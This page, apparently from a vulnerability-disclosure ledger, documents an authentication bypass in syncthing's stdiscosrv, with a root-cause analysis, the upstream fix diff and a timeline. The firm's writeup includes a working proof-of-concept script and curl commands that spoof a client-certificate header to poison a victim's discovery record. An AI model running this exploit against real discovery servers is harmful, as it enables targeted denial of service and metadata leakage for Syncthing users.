@@ -1,0 +1,527 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-B324R0JY · syncthing/syncthing</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-B324R0JY · syncthing/syncthing</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  auth-bypass
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-critical">critical</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-B324R0JY: stdiscosrv trusts proxy header for client identity in direct-TLS mode → DeviceID poisoning</h1>
+<p>In stdiscosrv's announcement endpoint (POST /), when the connection lacks a TLS client certificate the handler falls back to reading the client DeviceID from a proxy header that the remote client fully controls. That spoofed DeviceID and the announced addresses are passed to db.merge(&amp;deviceID, dbAddrs, seen) at apisrv.go:326 and persisted. Under the default direct-TLS deployment (no fronting proxy), any internet client can therefore create or overwrite the discovery record for an arbitrary victim DeviceID. This breaks the discovery server's core identity-binding guarantee and lets an attacker point peers looking up the victim to attacker-chosen addresses.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> syncthing/syncthing<br>
+<strong>Location:</strong> <code>cmd/stdiscosrv/apisrv.go:326</code>  </p>
+<h2>Technical Details</h2>
+<p>stdiscosrv POST / handler accepts an attacker-supplied proxy header as the client DeviceID when no TLS client certificate is presented, and writes the announced addresses to db.merge(&amp;deviceID, dbAddrs, seen) at apisrv.go:326. On the default direct-TLS configuration, any internet client can register/overwrite addresses for any victim DeviceID, breaking the discovery server's identity-binding guarantee.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Connect to stdiscosrv's POST / endpoint without presenting a TLS client certificate.</li>
+<li>Set the proxy header to the target victim's DeviceID.</li>
+<li>Submit an announcement body containing attacker-controlled addresses.</li>
+<li>Handler accepts the header as the DeviceID and calls db.merge(&amp;deviceID, dbAddrs, seen) at apisrv.go:326, persisting the spoofed record.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>In cmd/stdiscosrv/apisrv.go, when running in direct-TLS mode, ignore proxy-forwarded identity headers and require the TLS client certificate; derive deviceID only from the presented cert hash.</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-B324R0JY.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-B324R0JY<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Vulnerability Header</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerability Title</td>
+<td>Stdiscosrv Trusts Proxy-Supplied Client Certificate Headers in Direct-TLS Mode, Enabling Unauthenticated DeviceID Record Poisoning</td>
+</tr>
+<tr>
+<td>Severity Rating</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Bug Category</td>
+<td>Authentication Bypass / Improper Trust of Reverse-Proxy Headers</td>
+</tr>
+<tr>
+<td>Location</td>
+<td><code>cmd/stdiscosrv/apisrv.go:333</code> (<code>certificateBytes</code>), <code>cmd/stdiscosrv/apisrv.go:257</code> (call site in <code>handlePOST</code>)</td>
+</tr>
+<tr>
+<td>Affected Versions</td>
+<td>All releases since v1.19.0 (proxy-header fallback introduced in commit <code>083fa1803</code>, January 2022); confirmed on main at <code>44abd15162</code></td>
+</tr>
+</tbody>
+</table>
+<h2>Executive Summary</h2>
+<p>In stdiscosrv's announcement endpoint (<code>POST /</code>), when the connection lacks a TLS client certificate, the handler falls back to reading the client certificate from one of three reverse-proxy headers (<code>X-Ssl-Cert</code>, <code>X-Tls-Client-Cert-Der-Base64</code>, <code>X-Forwarded-Tls-Client-Cert</code>). This fallback is enabled in <strong>every</strong> deployment mode, including the default direct-TLS mode where no reverse proxy is in the request path and those headers are therefore attacker-controlled.</p>
+<p>An unauthenticated remote attacker who possesses a victim's public certificate (commonly available to any past sync peer, relay operator, or discovery operator the victim has ever announced to) can register or overwrite the discovery record for the victim's DeviceID with attacker-chosen addresses. This breaks the discovery server's identity-binding guarantee and enables targeted denial of service and peer-graph metadata leakage. End-to-end sync data is not affected because the sync protocol independently authenticates peers via TLS client-cert pinning, which the attacker cannot bypass without the victim's private key.</p>
+<h2>Root Cause Analysis</h2>
+<h3>Technical Description</h3>
+<p>stdiscosrv supports two deployment modes:</p>
+<ul>
+<li><strong>Direct-TLS mode (default).</strong> stdiscosrv terminates TLS itself. Per the <a href="https://docs.syncthing.net/specs/globaldisco-v3.html">Global Discovery Protocol v3 specification</a>, announcing clients are <strong>required</strong> to present a TLS client certificate; the server identifies the client by computing <code>DeviceID = SHA256(rawCert)</code> and uses that identity to bind announced addresses.</li>
+<li><strong>Reverse-proxy mode (<code>--http</code>).</strong> A trusted reverse proxy terminates TLS, verifies the client certificate cryptographically, then forwards the request to stdiscosrv over plain HTTP, re-injecting the verified certificate into one of the supported headers.</li>
+</ul>
+<p>The function <code>certificateBytes</code> at <code>cmd/stdiscosrv/apisrv.go:333</code> is responsible for extracting the announcing client's certificate. It first tries to read it from the actual TLS handshake:</p>
+<pre tabindex="0"><code class="language-go">func certificateBytes(req *http.Request) ([]byte, error) {
+    if req.TLS != nil &amp;&amp; len(req.TLS.PeerCertificates) &gt; 0 {
+        return req.TLS.PeerCertificates[0].Raw, nil
+    }
+
+    var bs []byte
+
+    if hdr := req.Header.Get(&quot;X-Ssl-Cert&quot;); hdr != &quot;&quot; {
+        // ... parse PEM ...
+    } else if hdr := req.Header.Get(&quot;X-Tls-Client-Cert-Der-Base64&quot;); hdr != &quot;&quot; {
+        // ... base64-decode ...
+    } else if cert := req.Header.Get(&quot;X-Forwarded-Tls-Client-Cert&quot;); cert != &quot;&quot; {
+        // ... reconstruct PEM ...
+    }
+    // ...
+}
+</code></pre>
+<p>The header-based branches were introduced to support the reverse-proxy deployment, where TLS terminates at the proxy and <code>req.TLS.PeerCertificates</code> is therefore unavailable. However, the fallback is taken <strong>regardless of whether the server is actually running behind a proxy</strong>. The deployment-mode flag <code>s.useHTTP</code> is consulted only for listener choice (<code>apisrv.go:94</code>) and for parsing <code>X-Forwarded-For</code> (<code>apisrv.go:162</code>); it does not gate the certificate-source headers.</p>
+<p>In direct-TLS mode, an attacker can:</p>
+<ol>
+<li>Connect to stdiscosrv directly over TLS without presenting a client certificate. The TLS listener is configured with <code>ClientAuth: tls.RequestClientCert</code> (<code>apisrv.go:104</code>), which requests but does not require a client cert, so the handshake succeeds.</li>
+<li>Issue <code>POST /</code> with the victim's public certificate placed in <code>X-Tls-Client-Cert-Der-Base64</code> (or one of the other accepted headers).</li>
+<li><code>certificateBytes</code> returns the attacker-supplied certificate, <code>handlePOST</code> computes <code>DeviceID = SHA256(rawCert)</code> (<code>apisrv.go:275</code>) — yielding the victim's DeviceID — and <code>handleAnnounce</code> persists the attacker-controlled addresses via <code>db.merge</code> (<code>apisrv.go:326</code>).</li>
+</ol>
+<p>The crucial difference between the two sources is that <code>req.TLS.PeerCertificates[0]</code> is the cryptographic outcome of a successful TLS handshake (the client proved possession of the matching private key via <code>CertificateVerify</code>), while a header value is just bytes the client asked the server to trust. In proxy mode a trusted intermediary supplies the latter; in direct-TLS mode there is no such intermediary.</p>
+<h3>First Faulty Condition</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th><code>cmd/stdiscosrv/apisrv.go</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Line</td>
+<td>333</td>
+</tr>
+<tr>
+<td>Condition</td>
+<td><code>certificateBytes</code> reads client certificate material from request headers (<code>X-Ssl-Cert</code>, <code>X-Tls-Client-Cert-Der-Base64</code>, <code>X-Forwarded-Tls-Client-Cert</code>) without checking whether the server is running in <code>--http</code> (reverse-proxy) mode. In direct-TLS mode no proxy has validated those headers, so they are attacker-controlled.</td>
+</tr>
+</tbody>
+</table>
+<h3>Trace Analysis</h3>
+<p>Logic-bug trace from the entry point to the misbehavior:</p>
+<ul>
+<li><code>apisrv.go:141</code> — <code>apiSrv.handler</code> dispatches the incoming HTTP request.</li>
+<li><code>apisrv.go:188</code> — POST is routed to <code>handlePOST</code>.</li>
+<li><code>apisrv.go:257</code> — <code>handlePOST</code> calls <code>certificateBytes(req)</code> to obtain the announcing client's certificate.</li>
+<li><code>apisrv.go:334</code> — <code>certificateBytes</code> finds <code>req.TLS.PeerCertificates</code> empty (attacker connected over TLS without presenting a client cert) and falls through.</li>
+<li><code>apisrv.go:340-414</code> — <code>certificateBytes</code> reads the certificate from <code>X-Ssl-Cert</code> / <code>X-Tls-Client-Cert-Der-Base64</code> / <code>X-Forwarded-Tls-Client-Cert</code> headers without verifying the deployment is behind a proxy. <strong>First faulty condition.</strong></li>
+<li><code>apisrv.go:275</code> — <code>handlePOST</code> derives the DeviceID via <code>protocol.NewDeviceID(rawCert)</code>, which is <code>SHA256(rawCert)</code> (<code>lib/protocol/deviceid.go:46</code>). The resulting DeviceID matches the victim's, because the cert in the header is the victim's public certificate.</li>
+<li><code>apisrv.go:286</code> → <code>apisrv.go:305</code> — <code>handleAnnounce</code> invoked with the victim's DeviceID and attacker-supplied addresses.</li>
+<li><code>apisrv.go:326</code> — <code>s.db.merge(&amp;deviceID, dbAddrs, seen)</code> persists the spoofed record (the merge is a sorted-list union, so attacker addresses are added alongside any legitimately-announced ones rather than replacing them).</li>
+</ul>
+<h2>Exploitability Assessment</h2>
+<h3>Attack Vector &amp; Reachability</h3>
+<table>
+<thead>
+<tr>
+<th>Attack vector</th>
+<th>Network.</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authentication required</td>
+<td>None.</td>
+</tr>
+<tr>
+<td>User interaction required</td>
+<td>None.</td>
+</tr>
+<tr>
+<td>Reachable in default config</td>
+<td>Yes. Default deployment is direct-TLS (no <code>--http</code> flag) and is documented as a fully supported configuration. The vulnerable header fallback fires unconditionally.</td>
+</tr>
+<tr>
+<td>Entry point(s)</td>
+<td><code>POST /</code> over TLS, omitting the client certificate during the handshake and supplying the victim's public certificate in <code>X-Tls-Client-Cert-Der-Base64</code> (or <code>X-Ssl-Cert</code> / <code>X-Forwarded-Tls-Client-Cert</code>).</td>
+</tr>
+</tbody>
+</table>
+<p>The primitive is <strong>discovery-layer integrity break</strong>, not a data-plane attack. Because the sync protocol authenticates peers end-to-end via TLS pinning to <code>DeviceID == SHA256(peer_cert)</code>, an attacker who poisons the discovery record with their own IP cannot complete a sync handshake as the victim — they hold only the victim's public certificate, not the matching private key. Realistic impact is therefore limited to:</p>
+<ol>
+<li>Targeted denial of service against the victim's reachability.</li>
+<li>Peer-graph metadata leakage (who is trying to reach whom).</li>
+<li>Cross-server amplification: a malicious operator of one public stdiscosrv can replay certificates legitimately collected during real announcements to poison records on other public discovery servers the victim does not use.</li>
+</ol>
+<p>The required prerequisite is possession of the victim's public certificate. Because the certificate is exchanged in every Syncthing TLS handshake (sync, relay, discovery), it is routinely available to any current or former peer of the victim, to any relay operator the victim has used, to any operator of a discovery server the victim has announced to, and to any network observer of a TLS 1.2 handshake involving the victim. This places the prerequisite at a relatively low bar in practice but it does prevent fully untargeted exploitation of arbitrary DeviceIDs.</p>
+<h3>Reproduction Steps</h3>
+<p><strong>Environment</strong></p>
+<table>
+<thead>
+<tr>
+<th>OS / version</th>
+<th>Ubuntu 24.04</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Target version / commit</td>
+<td><code>main</code> at <code>44abd15162c92bbf52abd2c594abdaad52f239bd</code> (<code>v2.1.0-rc.1+3</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Steps</strong></p>
+<ol>
+<li>Build and start stdiscosrv in default direct-TLS mode (no <code>--http</code> flag):</li>
+</ol>
+<p><code>bash
+   go run build.go -no-upgrade build stdiscosrv
+   ./stdiscosrv --listen=127.0.0.1:18443 \
+                --db-dir=$(pwd) \
+                --cert=$(pwd)/cert.pem \
+                --key=$(pwd)/key.pem \
+                -d</code></p>
+<ol>
+<li>Generate a "victim" certificate. Any small certificate works; this PoC uses EC P-256 because <code>openssl</code> generates it in one line. Real Syncthing clients use Ed25519 for sync connections (<code>lib/tlsutil/tlsutil.go:111</code>), which is even smaller. Note that <code>stdiscosrv</code> enforces <code>MaxHeaderBytes = 1 &lt;&lt; 10</code>, so any victim certificate whose base64-encoded DER form fits in the request header (true for both Ed25519 and EC P-256 in current Syncthing; false for legacy RSA-2048+ certificates) is exploitable:</li>
+</ol>
+<p><code>bash
+   openssl ecparam -name prime256v1 -genkey -noout -out victim_key.pem
+   openssl req -new -x509 -key victim_key.pem -out victim_cert.pem \
+               -days 365 -subj "/CN=v"</code></p>
+<ol>
+<li>Compute the victim's DeviceID. The DeviceID is <code>SHA256(cert.Raw)</code> encoded in Syncthing's base32+Luhn format. The attached helper <code>devid.go</code> (placed under <code>cmd/devid/</code> in the syncthing tree) does this; from the syncthing repo root:</li>
+</ol>
+<p><code>bash
+   mkdir -p cmd/devid &amp;&amp; cp /path/to/devid.go cmd/devid/main.go
+   VICTIM_ID=$(go run ./cmd/devid victim_cert.pem)
+   echo "$VICTIM_ID"</code></p>
+<ol>
+<li>Confirm no record exists yet for the victim:</li>
+</ol>
+<p><code>bash
+   curl -sk -o /dev/null -w "HTTP %{http_code}\n" \
+        "https://127.0.0.1:18443/?device=$VICTIM_ID"
+   # Expected: HTTP 404</code></p>
+<ol>
+<li><strong>Execute the attack.</strong> Connect to stdiscosrv directly over TLS <strong>without presenting any client certificate</strong>, supply the victim's public certificate in <code>X-Tls-Client-Cert-Der-Base64</code>, and announce attacker-chosen addresses:</li>
+</ol>
+<p><code>bash
+   DER_B64=$(openssl x509 -in victim_cert.pem -outform DER | base64 -w0)
+   curl -sk -i -X POST \
+        -H "Content-Type: application/json" \
+        -H "X-Tls-Client-Cert-Der-Base64: $DER_B64" \
+        --data '{"addresses":["tcp://6.6.6.6:6666","tcp://7.7.7.7:7777"]}' \
+        "https://127.0.0.1:18443/"
+   # Expected: HTTP/2 204 No Content (announcement accepted)</code></p>
+<ol>
+<li>Verify the victim's discovery record is now under attacker control:</li>
+</ol>
+<p><code>bash
+   curl -sk "https://127.0.0.1:18443/?device=$VICTIM_ID"
+   # Expected: HTTP 200
+   # {"seen":"...","addresses":["tcp://6.6.6.6:6666","tcp://7.7.7.7:7777"]}</code></p>
+<p>The attached <code>poc.sh</code> performs steps 2–6 end-to-end against an already-running stdiscosrv on <code>127.0.0.1:18443</code>.</p>
+<p><strong>Expected output</strong></p>
+<pre tabindex="0"><code>Lookup BEFORE attack:           HTTP 404
+Attacker POST:                  HTTP/2 204
+Lookup AFTER attack:            HTTP/2 200
+                                {&quot;addresses&quot;:[&quot;tcp://6.6.6.6:6666&quot;,&quot;tcp://7.7.7.7:7777&quot;]}
+</code></pre>
+<p><strong>PoC files</strong></p>
+<ul>
+<li><code>poc.sh</code> — attack script (steps 2–6).</li>
+<li><code>devid.go</code> — helper that prints the Syncthing DeviceID for a given PEM-encoded certificate. Drop into <code>cmd/devid/main.go</code> of the syncthing source tree.</li>
+<li><code>diff.patch</code> — reference fix described below.</li>
+</ul>
+<h2>Recommended Fix</h2>
+<p><strong>Option 1 (recommended).</strong> Refuse the proxy-header fallback when stdiscosrv is not running in <code>--http</code> mode. The protocol specification already states that announcements without a client certificate must be rejected with 403 Forbidden, so this restores the documented behavior in the default deployment. The change is small (≈10 lines) and is provided as <code>diff.patch</code>:</p>
+<ul>
+<li>Convert <code>certificateBytes</code> from a free function to a method on <code>*apiSrv</code> so it can read the deployment-mode flag.</li>
+<li>After the TLS-peer-certificate short-circuit, return early when <code>!s.useHTTP</code>, before any header is inspected.</li>
+</ul>
+<pre tabindex="0"><code class="language-go">func (s *apiSrv) certificateBytes(req *http.Request) ([]byte, error) {
+    if req.TLS != nil &amp;&amp; len(req.TLS.PeerCertificates) &gt; 0 {
+        return req.TLS.PeerCertificates[0].Raw, nil
+    }
+
+    // Proxy-supplied client cert headers are only trustworthy when stdiscosrv
+    // is running behind a reverse proxy that has terminated TLS and verified
+    // the client cert. In direct-TLS mode (the default) these headers are
+    // attacker-controlled and must be ignored.
+    if !s.useHTTP {
+        return nil, errors.New(&quot;no client certificate&quot;)
+    }
+
+    var bs []byte
+    // ... existing X-Ssl-Cert / X-Tls-Client-Cert-Der-Base64 /
+    //     X-Forwarded-Tls-Client-Cert parsing unchanged ...
+}
+</code></pre>
+<p>The fix has been verified on the same setup: the attack POST that previously returned <code>204 No Content</code> now returns <code>403 Forbidden</code>, no record is created, and a legitimate client presenting a real TLS client certificate (<code>curl --cert victim_cert.pem --key victim_key.pem ...</code>) continues to announce successfully.</p>
+<p><strong>Option 2 (defense in depth).</strong> In the operator documentation, add an explicit warning that the <code>X-Ssl-Cert</code>, <code>X-Tls-Client-Cert-Der-Base64</code>, and <code>X-Forwarded-Tls-Client-Cert</code> headers are only honored in <code>--http</code> mode, and that a reverse proxy deployed in front of stdiscosrv must scrub any such headers received from clients before forwarding requests.</p>
+<p>Patch provenance: AI-generated, Human-reviewed.</p>
+<h2>References</h2>
+<ul>
+<li><a href="https://docs.syncthing.net/specs/globaldisco-v3.html">Syncthing Global Discovery Protocol v3</a> — specifies that announcements require client certificate authentication and that the DeviceID is derived from the presented certificate.</li>
+<li><a href="https://docs.syncthing.net/users/stdiscosrv.html">stdiscosrv operator documentation</a> — describes direct-TLS as a supported default deployment and the reverse-proxy headers as a proxy-mode mechanism.</li>
+<li><a href="https://docs.syncthing.net/users/faq.html">Syncthing FAQ — Device ID secrecy</a> — confirms DeviceIDs are public identifiers.</li>
+<li>CWE-290: Authentication Bypass by Spoofing.</li>
+<li>CWE-345: Insufficient Verification of Data Authenticity.</li>
+<li>Commit <code>083fa1803</code> (PR #8092, January 2022) — introduced the proxy-header fallback that became the vulnerable code path.</li>
+</ul>
+<h2>Attribution</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by <strong>Adrian Denkiewicz</strong> at <strong>Doyensec</strong> in collaboration with Anthropic Research.</p>
+<p>For CVE credits and public acknowledgments: <strong>Doyensec in collaboration with Claude and Anthropic Research</strong></p>
+<h2>Attachment: <code>diff.patch</code></h2>
+<pre tabindex="0"><code>diff --git a/cmd/stdiscosrv/apisrv.go b/cmd/stdiscosrv/apisrv.go
+index 3a94dd3e9..b7b1239b5 100644
+--- a/cmd/stdiscosrv/apisrv.go
++++ b/cmd/stdiscosrv/apisrv.go
+@@ -254,7 +254,7 @@ func (s *apiSrv) handleGET(w http.ResponseWriter, req *http.Request) {
+ func (s *apiSrv) handlePOST(remoteAddr *net.TCPAddr, w http.ResponseWriter, req *http.Request) {
+    reqID := req.Context().Value(idKey).(requestID)
+
+-   rawCert, err := certificateBytes(req)
++   rawCert, err := s.certificateBytes(req)
+    if err != nil {
+        slog.Debug(&quot;Request without certificates&quot;, &quot;id&quot;, reqID, &quot;error&quot;, err)
+        announceRequestsTotal.WithLabelValues(&quot;no_certificate&quot;).Inc()
+@@ -330,11 +330,19 @@ func handlePing(w http.ResponseWriter, _ *http.Request) {
+    w.WriteHeader(http.StatusNoContent)
+ }
+
+-func certificateBytes(req *http.Request) ([]byte, error) {
++func (s *apiSrv) certificateBytes(req *http.Request) ([]byte, error) {
+    if req.TLS != nil &amp;&amp; len(req.TLS.PeerCertificates) &gt; 0 {
+        return req.TLS.PeerCertificates[0].Raw, nil
+    }
+
++   // Proxy-supplied client cert headers are only trustworthy when stdiscosrv
++   // is running behind a reverse proxy that has terminated TLS and verified
++   // the client cert. In direct-TLS mode (the default) these headers are
++   // attacker-controlled and must be ignored.
++   if !s.useHTTP {
++       return nil, errors.New(&quot;no client certificate&quot;)
++   }
++
+    var bs []byte
+
+    if hdr := req.Header.Get(&quot;X-Ssl-Cert&quot;); hdr != &quot;&quot; {
+</code></pre>
+<h2>Attachment: <code>poc.sh</code></h2>
+<pre tabindex="0"><code>#!/bin/bash
+set -e
+cd /home/ubuntu/poc
+
+# Regenerate victim cert with EC P-256 (much smaller DER)
+openssl ecparam -name prime256v1 -genkey -noout -out victim_key.pem
+openssl req -new -x509 -key victim_key.pem -out victim_cert.pem -days 365 -subj &quot;/CN=v&quot; 2&gt;/dev/null
+DER_BYTES=$(openssl x509 -in victim_cert.pem -outform DER | wc -c)
+echo &quot;victim cert DER size: $DER_BYTES bytes&quot;
+
+# Recompute victim DeviceID (SHA256 of cert.Raw)
+cd /home/ubuntu/syncthing # this is cloned source code directory
+PATH=/usr/local/go-1.25/bin:$PATH go run ./cmd/devid /home/ubuntu/poc/victim_cert.pem &gt; /tmp/vid
+VICTIM_ID=$(cat /tmp/vid)
+echo &quot;victim DeviceID: $VICTIM_ID&quot;
+cd /home/ubuntu/poc
+
+DER_B64=$(openssl x509 -in victim_cert.pem -outform DER | base64 -w0)
+echo &quot;base64 length: ${#DER_B64}&quot;
+echo
+
+echo &quot;==========================================&quot;
+echo &quot;STEP 1: Lookup BEFORE (expect 404)&quot;
+echo &quot;==========================================&quot;
+curl -sk -o /dev/null -w &quot;HTTP %{http_code}\n&quot; &quot;https://127.0.0.1:18443/?device=$VICTIM_ID&quot;
+echo
+
+echo &quot;==========================================&quot;
+echo &quot;STEP 2: Attacker POST (no client cert; spoofed X-Tls-Client-Cert-Der-Base64)&quot;
+echo &quot;==========================================&quot;
+curl -sk -i \
+  -X POST \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;X-Tls-Client-Cert-Der-Base64: $DER_B64&quot; \
+  --data '{&quot;addresses&quot;:[&quot;tcp://6.6.6.6:6666&quot;,&quot;tcp://7.7.7.7:7777&quot;]}' \
+  &quot;https://127.0.0.1:18443/&quot; | head -8
+echo
+
+echo &quot;==========================================&quot;
+echo &quot;STEP 3: Lookup AFTER&quot;
+echo &quot;==========================================&quot;
+curl -sk -i &quot;https://127.0.0.1:18443/?device=$VICTIM_ID&quot; | head -20
+echo
+echo &quot;Saving victim DeviceID for later reference: $VICTIM_ID&quot;
+</code></pre></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/cmd/stdiscosrv/apisrv.go b/cmd/stdiscosrv/apisrv.go</span>
+<span class="diff-h">index 3a94dd3e91d..7c486669cc5 100644</span>
+<span class="diff-h">--- a/cmd/stdiscosrv/apisrv.go</span>
+<span class="diff-h">+++ b/cmd/stdiscosrv/apisrv.go</span>
+<span class="diff-h">@@ -254,7 +254,7 @@ func (s *apiSrv) handleGET(w http.ResponseWriter, req *http.Request) {</span>
+<span class="diff-c"> func (s *apiSrv) handlePOST(remoteAddr *net.TCPAddr, w http.ResponseWriter, req *http.Request) {</span>
+<span class="diff-c"> 	reqID := req.Context().Value(idKey).(requestID)</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-	rawCert, err := certificateBytes(req)</span>
+<span class="diff-a">+	rawCert, err := s.certificateBytes(req)</span>
+<span class="diff-c"> 	if err != nil {</span>
+<span class="diff-c"> 		slog.Debug(&quot;Request without certificates&quot;, &quot;id&quot;, reqID, &quot;error&quot;, err)</span>
+<span class="diff-c"> 		announceRequestsTotal.WithLabelValues(&quot;no_certificate&quot;).Inc()</span>
+<span class="diff-h">@@ -330,10 +330,13 @@ func handlePing(w http.ResponseWriter, _ *http.Request) {</span>
+<span class="diff-c"> 	w.WriteHeader(http.StatusNoContent)</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-func certificateBytes(req *http.Request) ([]byte, error) {</span>
+<span class="diff-a">+func (s *apiSrv) certificateBytes(req *http.Request) ([]byte, error) {</span>
+<span class="diff-c"> 	if req.TLS != nil &amp;&amp; len(req.TLS.PeerCertificates) &gt; 0 {</span>
+<span class="diff-c"> 		return req.TLS.PeerCertificates[0].Raw, nil</span>
+<span class="diff-c"> 	}</span>
+<span class="diff-a">+	if !s.useHTTP {</span>
+<span class="diff-a">+		return nil, errors.New(&quot;no certificate presented&quot;)</span>
+<span class="diff-a">+	}</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	var bs []byte</span>
+<span class="diff-c"> </span></code></pre></div>
+<p class="kicker"><a href="https://github.com/syncthing/syncthing/commit/774aa11795a9edc904e8849e772a47804cf2aeb6" rel="noopener noreferrer">https://github.com/syncthing/syncthing/commit/774aa11795a9edc904e8849e772a47804cf2aeb6</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-10</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-12</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-08-17</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">de0da45ed86fd10d44e03057e27a006b20bacdee8624c5a009c87453ce6834b64226c35871698a581e96030723b5c504051c7096ae0808b07a98adb40b60e711</p>
+<p class="kicker">Committed 2026-05-07 07:08 UTC</p>
+<p class="kicker">Revealed 2026-08-17 20:02 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-B324R0JY-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-B324R0JY%22%2C%22bug_class%22%3A%22auth_bypass%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-10T23%3A56%3A33%2B00%3A00%22%2C%22description%22%3A%22In%20stdiscosrv%27s%20announcement%20endpoint%20%28POST%20/%29%2C%20when%20the%20connection%20lacks%20a%20TLS%20client%20certificate%20the%20handler%20falls%20back%20to%20reading%20the%20client%20DeviceID%20from%20a%20proxy%20header%20that%20the%20remote%20client%20fully%20controls.%20That%20spoofed%20DeviceID%20and%20the%20announced%20addresses%20are%20passed%20to%20db.merge%28%26deviceID%2C%20dbAddrs%2C%20seen%29%20at%20apisrv.go%3A326%20and%20persisted.%20Under%20the%20default%20direct-TLS%20deployment%20%28no%20fronting%20proxy%29%2C%20any%20internet%20client%20can%20therefore%20create%20or%20overwrite%20the%20discovery%20record%20for%20an%20arbitrary%20victim%20DeviceID.%20This%20breaks%20the%20discovery%20server%27s%20core%20identity-binding%20guarantee%20and%20lets%20an%20attacker%20point%20peers%20looking%20up%20the%20victim%20to%20attacker-chosen%20addresses.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22cmd/stdiscosrv/apisrv.go%3A326%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22syncthing/syncthing%22%2C%22reproduction%22%3A%5B%221.%20Connect%20to%20stdiscosrv%27s%20POST%20/%20endpoint%20without%20presenting%20a%20TLS%20client%20certificate.%22%2C%222.%20Set%20the%20proxy%20header%20to%20the%20target%20victim%27s%20DeviceID.%22%2C%223.%20Submit%20an%20announcement%20body%20containing%20attacker-controlled%20addresses.%22%2C